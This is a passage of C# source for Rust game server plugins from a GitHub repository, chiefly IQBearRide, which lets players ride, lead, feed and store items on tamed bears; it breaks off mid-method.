            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["COMMAND_START_ERROR_SYNTAX"] = "Вы допустили ошибку в синтаксисе команды, используйте команду - iqfe start Key",
                ["COMMAND_STOP_ERROR_SYNTAX"] = "Вы допустили ошибку в синтаксисе команды, используйте команду - iqfe stop Key",
                ["COMMAND_ERROR_KEY"] = "Введнного вами ключа : {0} - не существует",
                ["COMMAND_START_SUCCESS"] = "Вы успешно запустили мероприятие с ключом {0}",
                ["COMMAND_STOP_SUCCESS"] = "Вы успешно остановили мероприятие с ключом {0}",
                ["COMMAND_STOP_ERROR_NOT_STARTED"] = "Мероприятие с ключом {0} еще не запущен",
                ["COMMAND_NOT_PERMISSIONS"] = "У вас недостаточно прав для использования этой команды",
            }, this, "ru");
            PrintWarning("Языковой файл загружен успешно | The language file was uploaded successfully");
        }
        #endregion
    }
}


// --- End of file: IQFestivalEvents.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/IQBearRide.cs ---
// --- Original Local Path: IQBearRide.cs ---

﻿using Oxide.Core;
using Oxide.Core.Plugins;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using Facepunch;
using Newtonsoft.Json;
using Oxide.Game.Rust.Cui;
using Rust;
using Rust.Ai;
using UnityEngine;
using VLB;
using Color = UnityEngine.Color;
using Debug = UnityEngine.Debug;
using System.Text;
using CompanionServer.Handlers;
using Time = UnityEngine.Time;

namespace Oxide.Plugins
{
    [Info("IQBearRide", "BadMandarin/ Support: Mercury", "0.0.52")]
    [Description("IQBearRide")]
    class IQBearRide : RustPlugin
    {
        /// <summary>
        /// 
        /// </summary>
        ///Обновление 0.0.3
        ///OnEntitySpawned(BaseNetworkable entity) был заменен на OnEntitySpawned(BaseCorpse corpse)
        ///OnEntityKill(BaseNetworkable entity) был заменен на OnEntityKill(Bear bear)
        ///yield return new WaitForSeconds заменил на yield return CoroutineEx.waitForSeconds
        ///Добавил в Unload() приравнивание _plugin к null
        ///Добавлено отслеживание ошибок при загрузки дата-файла
        ///Добавлена возможность сделать медведя бессмертным (Настраивается в конфигурации)
        ///Обновление 0.0.4
        ///Добавлены права для команды на выдачу медведя - iqbearride.givebear
        ///Добавлены права для команды на выдачу медвеженка - iqbearride.giveteddy
        ///Изменил команду выдачу медвеженка - iqbr.teddy
        ///Изменил команду выдачу медведя - iqbr.bear
        ///Обновление 0.0.5
        ///- Исправлена ошибка после обновления игры при открытии инвентаря медведя

        [PluginReference] Plugin IQChat;
        public void SendChat(string Message, BasePlayer player, ConVar.Chat.ChatChannel channel = ConVar.Chat.ChatChannel.Global)
        {
            if (IQChat)
                if (_config.UIAlertUse)
                    IQChat?.Call("API_ALERT_PLAYER_UI", player, Message);
                else IQChat?.Call("API_ALERT_PLAYER", player, Message, _config.CustomPrefix, _config.CustomAvatar);
            else player.SendConsoleCommand("chat.add", channel, 0, Message);
        }

        private const String PermissionsGiveBear = "iqbearride.givebear";
        private const String PermissionsGiveTeddyBear = "iqbearride.giveteddy";

        #region Variables
        private static IQBearRide _plugin;
        private static bool _unloading = false;

        private static Dictionary<uint, BearController> _bearControllers = new Dictionary<uint, BearController>();
        #endregion

        #region OxideHooks
        void OnServerInitialized()
        {
            _plugin = this;
            _unloading = false;
            StartPluginLoad();
        }
        void Init()
        {
            Unsubscribe("OnEntityTakeDamage");
            permission.RegisterPermission(PermissionsGiveBear, this);
            permission.RegisterPermission(PermissionsGiveTeddyBear, this);
        }
        void OnServerSave()
        {
            PluginData.SaveData();
        }

        void Unload()
        {
            _unloading = true;

            InterfaceManager.DestroyAll();

            try
            {
                foreach (var value in _bearControllers)
                {
                    var bearController = value.Value;
                    if (bearController == null)
                        continue;

                    bearController.SetRider(null);
                    var bear = bearController.BearOwner;

                    if (bear != null)
                    {
                        var data = PluginData.Get(bear.net.ID);
                        data.Health = bear.Health();
                        data.LastPosition = bear.transform.position;
                        bear.Kill();
                    }

                }

                _bearControllers.Clear();
            }
            catch (Exception e)
            {
                Debug.LogError($"Error in Unload! Message: {e.Message}!\n{e.StackTrace}");
            }

            PluginData.SaveData();

            _plugin = null;
        }
        object OnEntityTakeDamage(BaseCombatEntity entity, HitInfo hitInfo)
        {
            if (hitInfo == null)
                return null;

            var attacker = hitInfo.InitiatorPlayer;
            if (attacker == null || !(attacker is BasePlayer)) return null;
            {
                Bear bear = entity as Bear;
                if (bear != null && bear.OwnerID != 0 && bear.OwnerID.IsSteamId())
                    return false;
            }

            return null;
        }
        void OnEntitySpawned(BaseCorpse corpse)
        {
            if (corpse != null && corpse.ShortPrefabName.Contains("bear"))
            {
                int random = Core.Random.Range(0, 100);
                if (random > _config.YoungDropChance)
                    return;

                var def = ItemManager.FindItemDefinition("glue");
                ItemAmount itemBonus = new ItemAmount(def, 1f);
                corpse.resourceDispenser.finishBonus.Add(itemBonus);

                return;
            }
        }

        void OnEntityKill(BaseNetworkable entity)
        {
            if (entity == null) return;

            if (entity is Bear)
            {
                Puts("Bear killed");
                Bear bear = entity as Bear;
                _data.BearKilled(bear);
            }
           
        }

        private void OnEntityDismounted(BaseVehicleSeat chair, BasePlayer player)
        {
            if (chair == null || player == null) return;

            var bear = chair.parentEntity.Get(true) as Bear;
            if (bear == null) return;

            var controller = bear.GetComponent<BearController>();
            if (controller == null) return;

            controller.SetRider(null);

            CuiHelper.DestroyUi(player, InterfaceManager.UI_Instruction);
        }

        void OnEntityBuilt(Planner plan, GameObject go)
        {
            var item = plan.GetItem();
            if (item == null)
                return;

            var entity = go.ToBaseEntity();
            if (entity == null)
                return;

            var player = plan.GetOwnerPlayer();
            if (player == null)
                return;

            var pos = entity.transform.position;
            if (_config.BearItem.CompareTo(item))
            {
                var bear = PluginData.ItemToBear(player.userID, item.uid, pos, false);
                NextTick(() => entity.Kill());
                return;
            }

            if (_config.YoungBearItem.CompareTo(item))
            {
                var bear = PluginData.ItemToBear(player.userID, item.uid, pos, true);
                bear.OwnerID = player.userID;
                NextTick(() => entity.Kill());
                return;
            }
        }

        private void OnDispenserBonus(ResourceDispenser dispenser, BasePlayer player, Item item)
        {
            if (dispenser.name.Contains("bear.corpse") == false)
                return;

            if (item.info.shortname != "glue")
                return;

            item.Remove();
            player.GiveItem(_config.YoungBearItem.ToItem());

            return;
        }

        object OnMaxStackable(Item item)
        {
            if (_config.BearItem.CompareTo(item) || _config.YoungBearItem.CompareTo(item))
            {
                return 1;
            }

            return null;
        }

        object CanCombineDroppedItem(DroppedItem item, DroppedItem targetItem)
        {
            if (_config.BearItem.CompareTo(item.item) || _config.YoungBearItem.CompareTo(item.item))
            {
                return false;
            }

            if (_config.BearItem.CompareTo(targetItem.item) || _config.YoungBearItem.CompareTo(targetItem.item))
            {
                return false;
            }

            return null;
        }
        #endregion

        #region Commands

        [ConsoleCommand("UI_BearControl")]
        private void Console_BearControl(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            if (player == null)
                return;

            if (arg.HasArgs(2) == false)
            {
                return;
            }


            uint bear = 0;
            if (uint.TryParse(arg.Args[1], out bear) == false)
                return;

            BearController controller;
            if (_bearControllers.TryGetValue(bear, out controller) == false)
                return;

            if (controller.PlayersWithUI.Contains(player))
                controller.PlayersWithUI.Remove(player);

            var data = PluginData.Get(bear);
            if (IsFriend(data.OwnerId, player.userID) == false)
                return;

            switch (arg.Args[0])
            {
                case "ride":
                    {
                        controller.SetRider(player);
                        break;
                    }

                case "inventory":
                    {
                        OpenContainer(player, data.Container, _config.InventorySize);
                        break;
                    }

                case "lead":
                    {
                        if (controller.HasLead())
                        {
                            controller.SetLead(null);
                            break;
                        }

                        controller.SetLead(player);
                        break;
                    }

                case "pickup":
                    {
                        if (data.OwnerId != player.userID)
                        {
                            SendChat(GetLang("BEAR_PICK_UP", player.UserIDString), player);
                            break;
                        }

                        if (data.Container.itemList.Count > 0)
                        {
                            SendChat(GetLang("BEAR_PICK_UP_FULL_INVENTORY", player.UserIDString), player);
                            break;
                        }

                        data.Health = controller.BearOwner.Health();
                        var item = PluginData.BearToItem(bear);
                        player.GiveItem(item);
                        controller.BearOwner.Kill();
                        break;
                    }
            }
        }

        [ConsoleCommand("iqbr.bear")]
        private void Console_BearAdd(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();

            if (player != null && !permission.UserHasPermission(player.UserIDString, PermissionsGiveBear)) return;

            if (arg.Args == null || arg.Args.Length < 1)
            {
                if (player == null) Puts("Wrong syntax! Usage: iqbr.bear <SteamID:Name:IP>");
                else player.ConsoleMessage("Wrong syntax! Usage: iqbr.bear <SteamID:Name:IP>");
                return;
            }

            string playerid = arg.Args[0];
            BasePlayer basePlayer = BasePlayer.Find(playerid);
            if (basePlayer == null)
            {
                if (player == null) Puts("Error! Player not found!");
                else player.ConsoleMessage("Error! Player not found!");
                return;
            }

            basePlayer.GiveItem(_config.BearItem.ToItem());

            if (player == null) Puts("Success! Item added to inventory!");
            else player.ConsoleMessage("Success! Item added to inventory!");
        }

        [ConsoleCommand("iqbr.teddy")]
        private void Console_YoungBearAdd(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            if (player != null && !permission.UserHasPermission(player.UserIDString, PermissionsGiveTeddyBear)) return;

            if (arg.Args == null || arg.Args.Length < 1)
            {
                if (player == null) Puts("Wrong syntax! Usage: iqbr.teddy <SteamID:Name:IP>");
                else player.ConsoleMessage("Wrong syntax! Usage: iqbr.teddy <SteamID:Name:IP>");
                return;
            }

            string playerid = arg.Args[0];
            BasePlayer basePlayer = BasePlayer.Find(playerid);
            if (basePlayer == null)
            {
                if (player == null) Puts("Error! Player not found!");
                else player.ConsoleMessage("Error! Player not found!");
                return;
            }

            basePlayer.GiveItem(_config.YoungBearItem.ToItem());

            if (player == null) Puts("Success! Item added to inventory!");
            else player.ConsoleMessage("Success! Item added to inventory!");
        }
        #endregion

        #region Utils

        private static bool IsFriend(ulong player, ulong friend)
        {
            if (player == friend)
                return true;
            RelationshipManager.PlayerTeam team = RelationshipManager.Instance.FindTeam(player);
            //var team = RelationshipManager.ServerInstance.FindPlayersTeam(player);
            if (team == null)
                return false;

            return team.members.Contains(friend);
        }

        private void OpenContainer(BasePlayer player, ItemContainer container, int capacity)
        {
            var loot = player.inventory.loot;
            var position = player.transform.position - new Vector3(0, 500, 0);
            var entity = GameManager.server.CreateEntity("assets/prefabs/visualization/sphere.prefab", position);
            if (entity == null)
            {
                return;
            }

            entity.enableSaving = false;
            entity.Spawn();
            container.entityOwner = entity;
            container.playerOwner = player;
            container.capacity = capacity;
            foreach (var item in container.itemList.ToArray())
            {
                if (item.position >= capacity)
                {
                    item.RemoveFromContainer();
                    item.MoveToContainer(container);
                }
            }

            entity.StartCoroutine(UserChecker(player, entity));

            _plugin.timer.Once(0.5f, () =>
            {
                if (player == null)
                {
                    return;
                }

                loot.Clear();
                loot.PositionChecks = false;
                loot.entitySource = entity;
                loot.itemSource = (Item)null;
                loot.MarkDirty();
                loot.AddContainer(container);
                loot.SendImmediate();
                player.ClientRPCPlayer(null, player, "RPC_OpenLootPanel", "generic");
                player.SendNetworkUpdateImmediate();
            });
        }

        private static double GetCurrentTime()
        {
            return new TimeSpan(DateTime.UtcNow.Ticks).TotalSeconds;
        }

        public static string GetColor(string hex, float alpha = 1f)
        {
            if (hex.Length != 7) hex = "#FFFFFF";
            if (alpha < 0 || alpha > 1f) alpha = 1f;

            var color = ColorTranslator.FromHtml(hex);
            var r = Convert.ToInt16(color.R) / 255f;
            var g = Convert.ToInt16(color.G) / 255f;
            var b = Convert.ToInt16(color.B) / 255f;

            return $"{r} {g} {b} {alpha}";
        }

        private static void DrawText(BasePlayer player, Vector3 position, string text, float time = 1)
        {
            player.SetPlayerFlag(BasePlayer.PlayerFlags.IsAdmin, true);
            player.SendEntityUpdate();
            player.SendConsoleCommand("ddraw.text", time, Color.white, position, text);
            player.SendConsoleCommand("camspeed 0");

            if (player.Connection.authLevel < 2)
                player.SetPlayerFlag(BasePlayer.PlayerFlags.IsAdmin, false);

            player.SendEntityUpdate();
        }

        private IEnumerator UserChecker(BasePlayer player, BaseEntity entity)
        {
            while (Vector3.Distance(player.transform.position, entity.transform.position + new Vector3(0, 500, 0)) < 2f)
            {
                yield return CoroutineEx.waitForSeconds(1f);

                if (entity == null || player == null)
                    break;

                if (player.IsConnected == false)
                    break;
            }

            player.EndLooting();

            //Puts("stopped!");
            yield break;
        }
        #endregion

        #region Controller

        private class BearController : MonoBehaviour
        {
            #region Variables

            public List<BasePlayer> PlayersWithUI = new List<BasePlayer>();

            public bool ShouldGrow = false;
            public int GrowingSeconds = 0;

            public float currentSpeed;
            public float walkSpeed = _config.WalkSpeed;
            public float leadSpeed = _config.LeadSpeed;
            public float runSpeed = _config.RunSpeed;
            public float sprintSpeed = _config.SprintSpeed;
            public float rotateSpeed = _config.RotateSpeed;

            public float maxWallClimbSlope = _config.MaxWallClimbSlope;
            public float maxStepHeight = _config.StepHigh;
            public float maxStepDownHeight = _config.StepDown;
            public float obstacleDetectionRadius = _config.ObsCheckDis;
            public float maxWaterDepth = _config.MaxWaterDepth;

            private BaseRidableAnimal.RunState currentRunState = BaseRidableAnimal.RunState.stopped;
            private BasePlayer _rider;
            private BasePlayer _leadTarget;
            private BaseVehicleSeat _saddle;
            public Bear BearOwner;

            private float acceleration;
            private float desiredRotation;

            //Obstacle check variables
            private float cachedObstacleDistance = float.PositiveInfinity;
            private Vector3[] normalOffsets = new Vector3[7]
            {
                new Vector3(0.15f, 0.0f, 0.0f),
                new Vector3(-0.15f, 0.0f, 0.0f),
                new Vector3(0.0f, 0.0f, 0.15f),
                new Vector3(0.0f, 0.0f, 0.3f),
                new Vector3(0.0f, 0.0f, 0.6f),
                new Vector3(0.15f, 0.0f, 0.3f),
                new Vector3(-0.15f, 0.0f, 0.3f)
            };

            //Angle check variables
            private Vector3 averagedUp = Vector3.up;
            private Vector3 targetUp = Vector3.up;

            //Time check variables
            private float nextObstacleCheckTime;
            private float nextGroundNormalUpdateTime;
            private float lastMovementUpdateTime = -1f;
            private float nextEatTime = Time.time;

            #endregion

            #region MonoBehaviourHooks

            private void DoDung()
            {
                ItemManager.CreateByName("horsedung", 1, 0UL).Drop(BearOwner.transform.position + -BearOwner.transform.forward + Vector3.up * 1.1f + UnityEngine.Random.insideUnitSphere * 0.1f, -BearOwner.transform.forward, default(Quaternion));
            }
            private void Awake()
            {
                try
                {
                    BearOwner = GetComponent<Bear>();
                    if (BearOwner == null)
                    {
                        Destroy(this);
                        return;
                    }

                    BearOwner.SetMaxHealth(_config.MaxHealthAmount);
                    BearOwner.SetHealth(_config.MaxHealthAmount);

                    _bearControllers.Add(BearOwner.net.ID, this);

                    ClearBear();

                    InvokeRepeating(nameof(PlayerInput), 0.01f, 0.01f);
                    InvokeRepeating(nameof(PlayersChecker), 0.1f, 0.1f);
                    InvokeRepeating(nameof(AnimalDecay), 60f, 60f);
                    InvokeRepeating(nameof(DoDung), 60f, 210f);

                    AddSaddle();
                }
                catch (Exception e)
                {
                    uint id = BearOwner?.net.ID ?? 0;
                    if (_bearControllers.ContainsKey(id))
                        _bearControllers.Remove(id);
                    Destroy(this);

                    Debug.LogError($"[BearRide] Error in 'Awake' method! Message: {e.Message}\n {e.StackTrace}");
                }

            }

            private void Start()
            {
                var data = PluginData.Get(BearOwner.net.ID);

                if (data.GrowSeconds > 0)
                {
                    ShouldGrow = true;
                    GrowingSeconds = data.GrowSeconds;
                    StartCoroutine(DoGrow(data));
                }
            }

            public void FixedUpdate()
            {
                this.timeAlive += UnityEngine.Time.fixedDeltaTime;

                PlayerInput();
                EatNearbyFood();

                if (lastMovementUpdateTime == -1.0)
                    this.lastMovementUpdateTime = UnityEngine.Time.realtimeSinceStartup;

                float delta = UnityEngine.Time.realtimeSinceStartup - this.lastMovementUpdateTime;
                UpdateMovement(delta);

                this.lastMovementUpdateTime = UnityEngine.Time.realtimeSinceStartup;
            }


            #endregion

            #region Movement

            private void PlayerInput()
            {
                if (HasDriver() == false)
                    return;

                InputState inputState = _rider.serverInput;

                RiderInput(inputState, _rider);

                if (inputState.IsDown(BUTTON.USE))
                {
                    SwitchMoveState(BaseRidableAnimal.RunState.stopped);
                    TryAttack();
                }
            }

            public bool DropToGround(Vector3 targetPos, bool force = false)
            {
                float range = force ? 10000f : this.maxStepHeight + this.maxStepDownHeight;
                Vector3 pos = targetPos;
                Vector3 _;

                if (TransformUtil.GetGroundInfo(targetPos, out pos, out _, range, 278986753) == false)
                    return false;

                if (UnityEngine.Physics.CheckSphere(pos + Vector3.up * 1f, 0.2f, 278986753))
                    return false;

                float num = WaterFactor();
                if (num > 0.1f)
                {
                    pos.y += num;
                }

                BearOwner.transform.position = pos;
                return true;
            }

            public void UpdateGroundNormal(bool force = false)
            {
                if ((double)UnityEngine.Time.time >= (double)this.nextGroundNormalUpdateTime | force)
                {
                    this.nextGroundNormalUpdateTime = UnityEngine.Time.time + UnityEngine.Random.Range(0.2f, 0.3f);
                    this.targetUp = this.averagedUp;

                    var bearPos = BearOwner.transform.position;
                    var forward = BearOwner.transform.forward;
                    var right = BearOwner.transform.right;

                    var totalForward = forward * _config.BoardForward;
                    var totalRight = right * _config.BoardRight;

                    Vector3[] pawsPos = new Vector3[]
                    {
                        bearPos,
                        bearPos + totalForward + totalRight,
                        bearPos + totalForward - totalRight,
                        bearPos - totalForward + totalRight,
                        bearPos - totalForward - totalRight,
                    };

                    foreach (var groundSampleOffset in pawsPos)
                    {
                        Vector3 normal;
                        Vector3 _;
                        if (TransformUtil.GetGroundInfo(groundSampleOffset + Vector3.up * 2f, out _, out normal, 4f, (LayerMask)278986753, (Transform)null))
                            this.targetUp += normal;
                        else
                            this.targetUp += Vector3.up;
                    }
                    this.targetUp /= (float)(pawsPos.Length + 1);
                }
                this.averagedUp = Vector3.Lerp(this.averagedUp, this.targetUp, UnityEngine.Time.deltaTime * 2f);
            }

            private void LeadUpdate()
            {
                if (_leadTarget == null)
                    return;

                Vector3 position = _leadTarget.transform.position;
                Vector3 lhs1 = Vector3Ex.Direction2D(BearOwner.transform.position + BearOwner.transform.right * 1f, BearOwner.transform.position);
                Vector3 lhs2 = Vector3Ex.Direction2D(BearOwner.transform.position + BearOwner.transform.forward * 0.01f, BearOwner.transform.position);
                Vector3 rhs1 = Vector3Ex.Direction2D(position, BearOwner.transform.position);
                float num2 = Vector3.Dot(lhs1, rhs1);
                Vector3 rhs2 = rhs1;
                float num3 = Vector3.Dot(lhs2, rhs2);
                bool flag = (double)Vector3Ex.Distance2D(position, BearOwner.transform.position) > 2.5;
                int num4 = (double)Vector3Ex.Distance2D(position, BearOwner.transform.position) > 10.0 ? 1 : 0;
                if (flag || (double)num3 < 0.949999988079071)
                {
                    float num5 = Mathf.InverseLerp(0.0f, 1f, num2);
                    float num6 = 1f - Mathf.InverseLerp(-1f, 0.0f, num2);
                    this.desiredRotation = 0.0f;
                    this.desiredRotation += num5 * 1f;
                    this.desiredRotation += num6 * -1f;
                    if ((double)Mathf.Abs(this.desiredRotation) < 1.0 / 1000.0)
                        this.desiredRotation = 0.0f;
                    if (flag)
                    {
                        acceleration = 1;
                        this.SwitchMoveState(BaseRidableAnimal.RunState.walk);
                    }
                    else
                        this.SwitchMoveState(BaseRidableAnimal.RunState.stopped);
                }
                else
                {
                    this.desiredRotation = 0.0f;
                    this.SwitchMoveState(BaseRidableAnimal.RunState.stopped);
                }
                if (num4 != 0)
                {
                    SetLead(null);
                    this.SwitchMoveState(BaseRidableAnimal.RunState.stopped);
                }
            }

            #endregion

            #region Utils

            #region Public

            public void SetRider(BasePlayer player)
            {
                _leadTarget = null;

                if (_rider != null)
                {
                    CuiHelper.DestroyUi(player, InterfaceManager.UI_Instruction);
                    _saddle.DismountPlayer(_rider, true);
                }

                _rider = player;

                if (_rider != null)
                {
                    _plugin.DrawUI_BearMenu(_rider);
                    _saddle.MountPlayer(_rider);
                }
            }

            public void SetLead(BasePlayer player)
            {
                if (player != null)
                    SetRider(null);

                _leadTarget = player;
            }

            public bool HasLead() => _leadTarget != null;

            public bool HasDriver()
            {
                return _rider != null;
            }

            #endregion

            #region ObstacleChecks

            private float ObstacleSpeed(float obstacleDistance)
            {
                float num = 0;

                if (obstacleDistance > 3)
                {
                    float runSpeed = GetRunSpeed();
                    num = runSpeed * obstacleDistance / 30;
                    if (obstacleDistance > 4)
                    {
                        num = runSpeed;
                    }
                }

                return num;
            }

            public void MarkObstacleDistanceDirty()
            {
                this.nextObstacleCheckTime = 0.0f;
            }

            public float GetObstacleDistance()
            {
                if ((double)UnityEngine.Time.time >= (double)this.nextObstacleCheckTime)
                {
                    float desiredVelocity = this.GetDesiredVelocity();
                    if ((double)this.currentSpeed > 0.0 || (double)desiredVelocity > 0.0)
                        this.cachedObstacleDistance = this.ObstacleDistanceCheck(Mathf.Max(desiredVelocity, 2f));
                    this.nextObstacleCheckTime = UnityEngine.Time.time + UnityEngine.Random.Range(0.25f, 0.35f);
                }
                return this.cachedObstacleDistance;
            }

            public float ObstacleDistanceCheck(float speed = 10f)
            {
                int num1 = Mathf.Max(2, Mathf.Min((int)speed, 10));
                float num2 = 0.5f;
                int num3 = Mathf.CeilToInt((float)num1 / num2);
                float num4 = 0.0f;
                Vector3 direction = QuaternionEx.LookRotationForcedUp(BearOwner.transform.forward, Vector3.up) * Vector3.forward;
                Vector3 vector3_1 = BearOwner.transform.position + BearOwner.transform.forward * 0.2f + new Vector3(0, 0.3f);

                vector3_1.y = BearOwner.transform.position.y;
                Vector3 up = BearOwner.transform.up;
                for (int index1 = 0; index1 < num3; ++index1)
                {
                    float maxDistance = num2;
                    bool flag = false;
                    float num5 = 0.0f;
                    Vector3 pos1 = Vector3.zero;
                    Vector3 normal1 = Vector3.up;
                    Vector3 a = vector3_1;
                    Vector3 origin = a + Vector3.up * (this.maxStepHeight + this.obstacleDetectionRadius);
                    Vector3 vector3_2 = a + direction * maxDistance;
                    float num6 = this.maxStepDownHeight + this.obstacleDetectionRadius;
                    RaycastHit hitInfo;

                    if (UnityEngine.Physics.SphereCast(origin, this.obstacleDetectionRadius, direction, out hitInfo, maxDistance, 1486954753))
                    {
                        num5 = hitInfo.distance;
                        pos1 = hitInfo.point;
                        normal1 = hitInfo.normal;
                        flag = true;
                    }

                    if (!flag)
                    {
                        if (!TransformUtil.GetGroundInfo(vector3_2 + Vector3.up * 2f, out pos1, out normal1, 2f + num6, (LayerMask)278986753, (Transform)null))
                            return num4;
                        num5 = Vector3.Distance(a, pos1);
                        if (WaterLevel.Test(pos1 + Vector3.one * this.maxWaterDepth, true, BearOwner))
                        {
                            return num4;
                        }

                        flag = true;
                    }

                    if (flag)
                    {
                        double num7 = (double)Vector3.Angle(up, normal1);
                        float num8 = Vector3.Angle(normal1, Vector3.up);
                        if (num7 > maxWallClimbSlope || (double)num8 > (double)this.maxWallClimbSlope)
                        {
                            Vector3 vector3_3 = normal1;
                            float y = pos1.y;
                            int num9 = 1;
                            for (int index2 = 0; index2 < this.normalOffsets.Length; ++index2)
                            {
                                Vector3 vector3_4 = vector3_2 + this.normalOffsets[index2].x * BearOwner.transform.right;
                                float num10 = this.maxStepHeight * 2.5f;
                                Vector3 vector3_5 = Vector3.up * num10;
                                Vector3 pos2;
                                Vector3 normal2;
                                if (TransformUtil.GetGroundInfo(vector3_4 + vector3_5 + this.normalOffsets[index2].z * BearOwner.transform.forward, out pos2, out normal2, num6 + num10, (LayerMask)278986753, (Transform)null))
                                {
                                    ++num9;
                                    vector3_3 += normal2;
                                    y += pos2.y;
                                }
                            }

                            float num11 = y / (float)num9;
                            vector3_3.Normalize();
                            double num12 = (double)Vector3.Angle(up, vector3_3);
                            float num13 = Vector3.Angle(vector3_3, Vector3.up);
                            if (num12 > maxWallClimbSlope || (double)num13 > (double)this.maxWallClimbSlope || (double)Mathf.Abs(num11 - vector3_2.y) > (double)this.maxStepHeight)
                                return num4;
                        }
                    }

                    num4 += num5;
                    direction = QuaternionEx.LookRotationForcedUp(BearOwner.transform.forward, normal1) * Vector3.forward;
                    vector3_1 = pos1;
                }

                return num4;
            }

            #endregion

            #region Eat

            private void EatNearbyFood()
            {
                if (Time.time < (double)nextEatTime || currentRunState != BaseRidableAnimal.RunState.stopped)
                    return;

                var num = BearOwner.healthFraction;
                nextEatTime =
                    (float)(Time.time + (double)Core.Random.Range(2f, 3f) + Mathf.InverseLerp(0.5f, 1f, num) * 4.0);
                if (num >= 1.0)
                    return;
                var list = Pool.GetList<BaseEntity>();
                var transform1 = BearOwner.transform;
                Vis.Entities(transform1.position + transform1.forward * 1.5f, 2f, list, 67109377);
                list.Sort((a, b) => (b is DroppedItem).CompareTo(a is DroppedItem));
                foreach (var baseEntity in list)
                    if (!baseEntity.isClient)
                    {
                        var droppedItem = baseEntity as DroppedItem;
                        if ((bool)droppedItem && droppedItem.item != null &&
                            droppedItem.item.info.category == ItemCategory.Food)
                        {
                            var component = droppedItem.item.info.GetComponent<ItemModConsumable>();
                            if ((bool)component)
                            {
                                lastEatTime = Time.time;
                                BearOwner.Heal(_config.EatHealAmount);

                                BearOwner.SignalBroadcast(BaseEntity.Signal.Attack);
                                BearOwner.ClientRPC(null, "Attack", BearOwner.ServerPosition + Vector3.forward);

                                droppedItem.item.UseItem();
                                if (droppedItem.item.amount <= 0)
                                {
                                    droppedItem.Kill();
                                }

                                break;
                            }
                        }

                        var collectibleEntity = baseEntity as CollectibleEntity;
                        if ((bool)collectibleEntity && collectibleEntity.IsFood())
                        {
                            collectibleEntity.DoPickup(null);
                            break;
                        }

                        var growableEntity = baseEntity as GrowableEntity;
                        if ((bool)growableEntity && growableEntity.CanPick())
                        {
                            growableEntity.PickFruit(null);
                            break;
                        }
                    }

                Pool.FreeList(ref list);
            }

            #endregion

            #region Attack

            public float VisionRange = 0.5f;

            public float AttackRange = 2f;

            public float AttackRate = 1f;

            public float AttackDamage(string targetName)
            {
                float value = _config.BearDamage["default"];

                foreach (var keyValuePair in _config.BearDamage)
                {
                    if (targetName.Contains(keyValuePair.Key))
                        value = keyValuePair.Value;
                }

                return value;
            }

            public DamageType AttackDamageType = DamageType.Bite;

            private float nextAttackTime;

            [NonSerialized] private BaseEntity[] SensesResults = new BaseEntity[64];

            private void TryAttack()
            {
                var inSphere = BaseEntity.Query.Server.GetInSphere(BearOwner.transform.position, VisionRange, SensesResults,
                    AiCaresAbout);
                if (inSphere > 0)
                {
                    BaseEntity foundTarget = null;
                    float minDistance = float.MaxValue;
                    for (var index = 0; index < inSphere; ++index)
                    {
                        var sensesResult = SensesResults[index];
                        if (sensesResult == null || sensesResult.IsDestroyed
                                                 || sensesResult.net.ID == _rider.net.ID
                                                 || sensesResult.net.ID == BearOwner.net.ID) continue;

                        var dist = Vector3.Distance(sensesResult.transform.position, BearOwner.transform.position);
                        if (minDistance > dist)
                        {
                            foundTarget = sensesResult;
                            minDistance = dist;
                        }
                    }

                    if (foundTarget != null && WithinVisionCone(BearOwner, foundTarget))
                    {
                        var attackPosition = BearOwner.ServerPosition + BearOwner.transform.TransformDirection(BearOwner.AttackOffset);
                        if (IsVisible(attackPosition, foundTarget.CenterPoint()) || IsVisible(attackPosition, BearOwner.transform.position))
                        {
                            StartAttack(foundTarget);
                            return;
                        }
                    }
                }

                StartAttack(null);
            }

            private static bool WithinVisionCone(BaseNpc npc, BaseEntity other)
            {
                if (Mathf.Approximately(npc.Stats.VisionCone, -1f))
                    return true;
                var normalized = (other.ServerPosition - npc.ServerPosition).normalized;
                return Vector3.Dot(npc.transform.forward, normalized) >= npc.Stats.VisionCone;
            }
            public void Sphere(BasePlayer player, Vector3 pos, float radius, Color color, float duration)
            {
                player.SendConsoleCommand("ddraw.sphere", duration, color, pos, radius);
            }
            public TreeEntity CheckTree(BasePlayer player, Vector3 pos, Vector3 aim)
            {
                RaycastHit[] hit;
                hit = Physics.SphereCastAll(pos, 2.5f, Vector3.forward, 2.5f, LayerMask.GetMask("Tree"));

                foreach (var hits in hit)
                {
                    if (hits.GetEntity() == null) continue;

                    TreeEntity Tree = hits.GetEntity() as TreeEntity;
                    if (Tree == null) continue;
                    return Tree;
                }
                return null;
            }
            private void StartAttack(BaseEntity entity)
            {
                if (!AttackReady() /*|| _bear.GetFact(BaseNpc.Facts.IsAttackReady) == 0*/)
                    return;

                var target = entity as BaseCombatEntity;

                var Tree = CheckTree(BasePlayer.Find("Mercury"), BearOwner.transform.position, _rider.eyes.HeadForward());
                if (Tree != null)
                {
                    float DamageBear = AttackDamage(Tree.ShortPrefabName);
                    float MainFormul = Mathf.Min(DamageBear, Tree.Health()) / Tree.MaxHealth();
                    float Result = (Mathf.Clamp(DamageBear * UnityEngine.Random.Range(1, 5) / UnityEngine.Random.Range(1, 5), 0f, MainFormul * 8)) * 2.5f * 2f;
                    Int32 Amount = Mathf.FloorToInt(Result) + UnityEngine.Random.Range(1, 20);

                    global::Item item = global::ItemManager.CreateByName("wood", Amount, 0UL);
                    if (item == null)
                    {
                        return;
                    }
                    Interface.CallHook("OnDispenserGather", Tree.resourceDispenser, _rider, item);
                    var Data = _data.BearsData.Find(x => x.EntityId == BearOwner.net.ID);
                    item.MoveToContainer(Data.Container);

                    _rider.SendConsoleCommand($"note.inv 605467368 {item.amount} \"{_plugin.GetLang("BEAR_FARM_WOOD", _rider.UserIDString)}\"");

                    if (Tree.health > 0f)
                    {
                        Tree.ClientRPC<int>(null, "CrackSound", 1);
                        Tree.health -= DamageBear + UnityEngine.Random.Range(1, 50);
                    }
                    else
                    {
                        Tree.ClientRPC<Vector3>(null, "TreeFall", _rider.transform.position);
                        Tree.Invoke(() => Tree.Kill(BaseNetworkable.DestroyMode.None), 3f);
                    }
                }

                if (target != null)
                {
